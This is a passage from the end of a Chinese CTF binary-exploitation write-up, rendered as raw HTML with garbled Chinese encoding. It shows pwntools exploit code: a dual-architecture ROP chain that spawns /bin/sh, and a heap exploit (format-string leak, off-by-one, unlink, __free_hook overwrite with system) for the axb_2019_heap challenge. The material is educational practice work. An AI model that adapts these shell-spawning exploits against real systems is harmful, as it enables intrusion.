</span></span><span class=line><span class=cl>    <span class=n>pop_dcb</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>data86</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_eax</span><span class=p>,</span><span class=mh>0xb</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>int_80</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>payload86</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=n>chain86</span><span class=p>,</span><span class=n>word_size</span><span class=o>=</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pop_rax</span> <span class=o>=</span> <span class=mh>0x43b97c</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x4005f6</span>
</span></span><span class=line><span class=cl><span class=n>pop_rsi</span> <span class=o>=</span> <span class=mh>0x405895</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdx</span> <span class=o>=</span> <span class=mh>0x43b9d5</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=mh>0x461645</span>
</span></span><span class=line><span class=cl><span class=n>data64</span> <span class=o>=</span> <span class=mh>0x6a4e40</span>
</span></span><span class=line><span class=cl><span class=n>add_rsp_80</span> <span class=o>=</span> <span class=mh>0x40cd17</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset64</span> <span class=o>=</span> <span class=mh>0x80</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>payload86</span><span class=p>)</span> <span class=c1># rsp+0x0</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=nb>hex</span><span class=p>(</span><span class=n>offset64</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chain64</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>offset64</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rax</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rsi</span><span class=p>,</span><span class=n>data64</span><span class=p>,</span><span class=n>pop_rdx</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>syscall</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rax</span><span class=p>,</span><span class=mi>59</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>data64</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rsi</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>pop_rdx</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>syscall</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>payload64</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=n>chain64</span><span class=p>,</span><span class=n>word_size</span><span class=o>=</span><span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x110</span> <span class=o>+</span> <span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=n>add_esp_20</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;aaaa&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>add_rsp_80</span><span class=p>)</span> <span class=o>+</span> <span class=n>payload86</span> <span class=o>+</span> <span class=n>payload64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;?&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=axb_2019_heap class="relative group">axb_2019_heap <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#axb_2019_heap aria-label=é”šç‚¹>#</a></span></h3><p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å †åœ°å€å’Œ libcã€‚éšåï¼Œå¯ä»¥å‘ç° <code>edit</code> æ—¶å­˜åœ¨ off by oneï¼Œæˆ‘ä»¬åœ¨æ„é€  unlink çš„ fake chunk æ—¶ï¼Œè¯¥æ¼æ´ä¼šå¯¼è‡´ä¿®æ”¹ä¸‹ä¸€ä¸ª chunk çš„ <code>prev_size</code> åä¼šè¦†ç›–æ‰å®ƒçš„ <code>size</code> å­—æ®µæœ€åä¸€ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰‹åŠ¨æ¢å¤æœ€åä¸€ä¸ªå­—èŠ‚ã€‚ï¼Œè¿™é‡Œæ˜¯ <code>0xa0</code>ã€‚</p><p>æ¥ä¸‹æ¥å°±å¸¸è§„ unlinkï¼Œè¦†ç›– <code>free_hook</code> ä¸º <code>system</code>ï¼Œæ³¨æ„ç»´æŒåŸ <code>note</code> æ•°ç»„ç»“æ„ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name:&#39;</span><span class=p>,</span><span class=s1>&#39;%11$p.%15$p&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0x1186</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0x20830</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;heap&#39;</span><span class=p>,</span><span class=n>heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>note</span> <span class=o>=</span> <span class=n>heap</span><span class=o>+</span><span class=mh>0x202060</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x98</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x98</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=mh>0x90</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=n>note</span><span class=o>-</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>note</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x91</span><span class=p>,</span><span class=n>fd</span><span class=p>,</span><span class=n>bk</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x90</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\xa0</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>fake</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>free_hook</span><span class=p>,</span><span class=mh>0x98</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span></code></pre></div></div></section><footer class="max-w-prose pt-8 print:hidden"><div class=flex><picture class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"><img width=400 height=400 class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full" alt=Mercury loading=lazy decoding=async src=/avatar.png></picture><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">ä½œè€…</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">Mercury</div><div class="text-sm text-neutral-700 dark:text-neutral-400">Security Engineer</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" style=will-change:transform href=mailto:signormercurio@gmail.com target=_blank aria-label=Email rel="me noopener noreferrer"><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1-27.64 140.9 68.65 266.2 199.1 285.1 19.01 2.888 36.17-12.26 36.17-31.49l1e-4-.6631c0-15.74-11.44-28.88-26.84-31.24-84.35-12.98-149.2-86.13-149.2-174.2.0-102.9 88.61-185.5 193.4-175.4 91.54 8.869 158.6 91.25 158.6 183.2v16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98.0036c-7.299.0-13.2 4.992-15.12 11.68-24.85-12.15-54.24-16.38-86.06-5.106-38.75 13.73-68.12 48.91-73.72 89.64-9.483 69.01 43.81 128 110.9 128 26.44.0 50.43-9.544 69.59-24.88 24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3c0-149.2-133.9-265.632-287.3-235.57zM239.1 304.3c-26.47.0-48-21.56-48-48.05s21.53-48.05 48-48.05 48 21.56 48 48.05-20.6 48.05-48 48.05z"/></svg>
</span></a><a class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" style=will-change:transform href=https://github.com/SignorMercurio target=_blank aria-label=Github rel="me noopener noreferrer"><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></a><a class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" style=will-change:transform href=https://t.me/m9r_at_tG target=_blank aria-label=Telegram rel="me noopener noreferrer"><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M248 8C111.033 8 0 119.033.0 256S111.033 504 248 504 496 392.967 496 256 384.967 8 248 8zM362.952 176.66c-3.732 39.215-19.881 134.378-28.1 178.3-3.476 18.584-10.322 24.816-16.948 25.425-14.4 1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25 5.342-39.5 3.652-3.793 67.107-61.51 68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608 69.142-14.845 10.194-26.894 9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7 18.45-13.7 108.446-47.248 144.628-62.3c68.872-28.647 83.183-33.623 92.511-33.789 2.052-.034 6.639.474 9.61 2.885a10.452 10.452.0 013.53 6.716A43.765 43.765.0 01362.952 176.66z"/></svg></span></a></div></div></div></div><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="group flex" href=/posts/elgamal-ecc/><span class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"><span class="ltr:inline rtl:hidden">&larr;</span><span class="ltr:hidden rtl:inline">&rarr;</span></span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">ElGamal å¯†ç æ–¹æ¡ˆçš„æ¤­åœ†æ›²çº¿å½¢å¼å®ç°</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2019-12-20 00:00:00 +0000 UTC">2019-12-20</time>
</span></span></a></span><span><a class="group flex text-right" href=/posts/qtable-ss-pagination/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">æœ¯ä¸šä¸“æ”»ï¼šQTable æœåŠ¡ç«¯åˆ†é¡µå®è·µ</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2019-12-12 00:00:00 +0000 UTC">2019-12-12</time>
</span></span><span class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"><span class="ltr:inline rtl:hidden">&rarr;</span><span class="ltr:hidden rtl:inline">&larr;</span></span></a></span></div></div><div class=pt-3><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class=pt-3><link rel=stylesheet href=https://unpkg.com/@waline/client@v2/dist/waline.css><link rel=stylesheet href=https://unpkg.com/@waline/client@v2/dist/waline-meta.css><div id=waline></div><script type=module>
  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';

  init({
    el: '#waline',
    serverURL: 'https://waline-merc.vercel.app',
    emoji: [
      '//unpkg.com/@waline/emojis@1.1.0/alus',
      '//unpkg.com/@waline/emojis@1.1.0/tw-emoji',
    ],
    search: false,
    reaction: false,
    dark: 'auto',
  });
</script></div></div></footer></article><div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label=å›åˆ°é¡¶éƒ¨ title=å›åˆ°é¡¶éƒ¨>&uarr;</a></div></main><footer class="py-10 print:hidden"><nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex list-none flex-col sm:flex-row"><li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a href=https://creativecommons.org/licenses/by-nc/4.0/ title><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">CC BY-NC 4.0</span></a></li></ul></nav><div class="flex items-center justify-between"><div><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2024
Mercury</p><p class="text-xs text-neutral-500 dark:text-neutral-400">ç”± <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://github.com/jpanther/congo target=_blank rel="noopener noreferrer">Congo</a> å¼ºåŠ›é©±åŠ¨</p></div><div class="flex flex-row items-center"><div class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"><button id=appearance-switcher-0 type=button aria-label="appearance switcher"><div class="flex h-12 w-12 items-center justify-center dark:hidden" title=åˆ‡æ¢ä¸ºæ·±è‰²æ¨¡å¼><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="hidden h-12 w-12 items-center justify-center dark:flex" title=åˆ‡æ¢ä¸ºæµ…è‰²æ¨¡å¼><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div></div></footer><div id=search-wrapper class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm sm:p-6 md:p-[10vh] lg:p-[12vh] dark:bg-neutral-900/50" data-url=https://blog.sigmerc.top><div id=search-modal class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex flex-none items-center justify-between px-2"><form class="flex min-w-0 flex-auto items-center"><div class="flex h-8 w-8 items-center justify-center text-neutral-400"><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=æœç´¢ tabindex=0></form><button id=close-search-button class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="å…³é—­ (Esc)">
<span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto overflow-auto px-2"><ul id=search-results></ul></section></div></div></div></body></html>